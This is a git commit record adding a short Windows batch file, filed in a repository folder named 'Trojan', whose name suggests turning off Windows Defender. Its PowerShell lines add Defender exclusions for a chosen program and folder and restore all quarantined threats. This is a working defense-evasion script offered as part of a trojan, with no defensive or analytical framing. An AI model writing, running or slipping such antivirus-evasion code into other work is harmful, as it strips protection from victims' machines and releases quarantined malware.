b6791ebfed35f96678208c9917f649fc29269705
Amir Mahdi Zare <83335541+amir13872@users.noreply.github.com>
2025-03-04 18:44:48 +0330

    Create trurn_of_defender.bat

---
+++ Trojan/trurn_of_defender.bat
@@ -0,0 +1,6 @@
+@echo off
+powershell -Command "Add-MpPreference -ExclusionProcess 'C:\Path\To\Your\Program.exe'"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\Path\To\Your\Folder'"
+powershell -Command "Get-MpThreat | ForEach-Object { Restore-MpThreat -ThreatID $_.ThreatID }"
+echo The program has been allowed in Windows Defender.
+pause
